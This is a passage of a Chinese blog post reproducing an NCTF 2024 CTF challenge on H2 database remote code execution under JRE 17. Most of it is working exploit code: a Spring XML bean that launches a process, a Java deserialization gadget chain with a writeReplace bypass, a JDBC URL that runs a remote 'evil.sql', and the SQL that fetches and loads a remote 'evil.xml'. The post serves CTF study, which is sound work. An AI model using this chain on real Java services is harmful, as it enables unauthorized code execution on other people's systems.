+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[calc.exe]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Utils.patchModule(Main.class);</span><br><span class="line">Utils.patchModule(Utils.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8080/evil.sql&#x27;&quot;</span>;</span><br><span class="line"><span class="type">MyDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyDataSource</span>(url, <span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"><span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(dataSource);</span><br><span class="line"><span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line"><span class="type">UndoManager</span> <span class="variable">undoManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line"><span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector)Utils.getFieldValue(undoManager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">vector.add(pojoNode);</span><br><span class="line">Utils.setField(eventListenerList, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] bytes = Utils.serialize(eventListenerList);</span><br><span class="line">System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes));</span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line">Utils.unserialize(bytes);</span><br></pre></td></tr></table></figure>
+
+<p>会用到的一些工具类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Utils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">patchModule</span><span class="params">(Class clazz)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Module</span> <span class="variable">baseModule</span> <span class="operator">=</span> Object.class.getModule();</span><br><span class="line">            Class&lt;?&gt; unSafe = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">unSafeField</span> <span class="operator">=</span> unSafe.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            unSafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Unsafe</span> <span class="variable">unSafeClass</span> <span class="operator">=</span> (Unsafe)unSafeField.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unSafeClass.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">            unSafeClass.getAndSetObject(clazz, addr, baseModule);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(Class clazz, String name)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(name);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String name, Object value)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), name);</span><br><span class="line">        <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field.set(obj, value);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String name)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), name);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                result = field.get(obj);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// pass</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">createWithoutConstructor</span><span class="params">(String className)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Object.class.getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz,</span><br><span class="line">                    constructor);</span><br><span class="line">            constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            result = constructor1.newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            bytes = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">            obj = ois.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>计算器正常弹出，起码后半部分的RCE是没问题的，但是序列化时报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: Failed to JDK serialize `POJONode` value: Serialization failed, cause: &quot;java.io.NotSerializableException: org.springframework.context.support.ClassPathXmlApplicationContext&quot;; SQL statement:</span><br></pre></td></tr></table></figure>
+
+<p>原因是序列化时会通过writeReplace函数触发getter，然后生成了一个无法序列化的ClassPathXmlApplicationContext对象。如果把getter里面的getConnection调用注释掉，序列化出来的就会是ObjectNode，反序列化时同样无法触发getter，还是得想想办法绕过它的writeReplace。</p>
+<p>翻了一下，找到调用writeReplace函数的ObjectOutputStream类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// REMIND: skip this check for strings/arrays?</span></span><br><span class="line">    Class&lt;?&gt; repCl;</span><br><span class="line">    desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (!desc.hasWriteReplaceMethod() ||</span><br><span class="line">        (obj = desc.invokeWriteReplace(obj)) == <span class="literal">null</span> ||</span><br><span class="line">        (repCl = obj.getClass()) == cl)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cl = repCl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ObjectStreamClass.lookup：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectStreamClass <span class="title function_">lookup</span><span class="params">(Class&lt;?&gt; cl, <span class="type">boolean</span> all)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(all || Serializable.class.isAssignableFrom(cl))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Caches.localDescs.get(cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hasWriteReplaceMethod：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">hasWriteReplaceMethod</span><span class="params">()</span> &#123;</span><br><span class="line">    requireInitialized();</span><br><span class="line">    <span class="keyword">return</span> (writeReplaceMethod != <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>理论上，如果我们通过反射修改了ObjectStreamClass.Caches.localDescs里POJONode的writeReplaceMethod信息，或许就可以绕过writeReplace函数？</p>
+<p>试一试：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">patchWriteReplace</span><span class="params">(Class clazz)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ObjectStreamClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.io.ObjectStreamClass&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">lookup</span> <span class="operator">=</span> ObjectStreamClass.getDeclaredMethod(<span class="string">&quot;lookup&quot;</span>, Class.class, <span class="type">boolean</span>.class);</span><br><span class="line">        lookup.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> (ObjectStreamClass)lookup.invoke(<span class="literal">null</span>, clazz, <span class="literal">true</span>);</span><br><span class="line">        setField(desc, <span class="string">&quot;writeReplaceMethod&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>加上一行Utils.patchWriteReplace(POJONode.class)后，继续进行序列化和反序列化测试：</p>
+<p><img src="/css/images/JRE_H2RCE/01.png" srcset="/img/loading.gif"></p>
+<p>这下一切正常了。</p>
+<h4 id="H2-RCE-1"><a href="#H2-RCE-1" class="headerlink" title="H2 RCE"></a>H2 RCE</h4><p>琢磨一下payload，根据执行顺序，首先是SQL URL：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT<span class="operator">=</span><span class="number">3</span>;INIT<span class="operator">=</span>RUNSCRIPT <span class="keyword">FROM</span> <span class="string">&#x27;http://127.0.0.1:8080/evil.sql&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据里面的init和RUNSCRIPT字符，应该是从Web服务上抓取了一个SQL脚本文件来执行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS CLASS_FOR_NAME <span class="keyword">FOR</span> <span class="string">&#x27;java.lang.Class.forName(java.lang.String)&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS NEW_INSTANCE <span class="keyword">FOR</span> <span class="string">&#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS UNESCAPE_VALUE <span class="keyword">FOR</span> <span class="string">&#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@url_str</span><span class="operator">=</span><span class="string">&#x27;http://127.0.0.1:8080/evil.xml&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@url_obj</span><span class="operator">=</span>UNESCAPE_VALUE(<span class="variable">@url_str</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@context_clazz</span><span class="operator">=</span>CLASS_FOR_NAME(<span class="string">&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@string_clazz</span><span class="operator">=</span>CLASS_FOR_NAME(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> NEW_INSTANCE(<span class="variable">@context_clazz</span>, <span class="keyword">ARRAY</span>[<span class="variable">@string_clazz</span>], <span class="keyword">ARRAY</span>[<span class="variable">@url_obj</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>SQL脚本主要做的就是函数调用，通过类加载和实例化的方式，触发ClassPathXmlApplicationContext类加载xml来实现RCE。</p>
+<p>还有一点则是根据出题师傅的测试，直接将String作为参数调用newInstance会发生错误，因为SQL不像Java一样将String作为Object，所以需要先进行一次类型转换，所以师傅找到了Rdn.unescapeValue函数，该函数主要用于解码和删除一些非法字符，正常String传入之后会原封不动地String出来，只不过函数为了兼容，返回值定义的是Object，正好符合类型转换的要求，不得不说很是巧妙。</p>
+<h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>修改一下代码里面的命令为在tmp目录下创建文件，还有IP和MyDataSource类的package，以及docker启动代码方便调试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -p ctf -c <span class="string">&quot;/opt/java/openjdk/bin/java -jar /app/H2Revenge.jar &gt; /tmp/output.log 2&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用成功：</p>
+<p><img src="/css/images/JRE_H2RCE/02.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/JRE_H2RCE/03.png" srcset="/img/loading.gif"></p>
+<h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>hexo g的时候遇到了版本问题，遂更新一下hexo，<a href="https://xiejava1018.github.io/posts/442ea121/">参考文章</a>和<a href="https://blog.csdn.net/weixin_45149481/article/details/116609116">模板问题</a>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm outdated</span><br><span class="line">npm update hexo-cli hexo --latest</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://exp10it.io/2025/03/nctf-2024-web-writeup/#h2revenge">NCTF 2024 Web 出题小记</a></p>
+<p><a href="https://unam4.github.io/2024/11/12/h2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9C%A8jdk17%E4%B8%8B%E7%9A%84rce%E6%8E%A2%E7%B4%A2/">h2数据库在jdk17下的rce探索</a></p>
+<p><a href="https://xz.aliyun.com/news/17428">深入解析：高版本 JRE 下 H2 RCE 绕过新思路</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2025/07/22/hello-world/">
+                        <span>Hello World</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "JRE 17环境下的H2 Rce学习&nbsp;",
+      ],
+      cursorChar: "_",
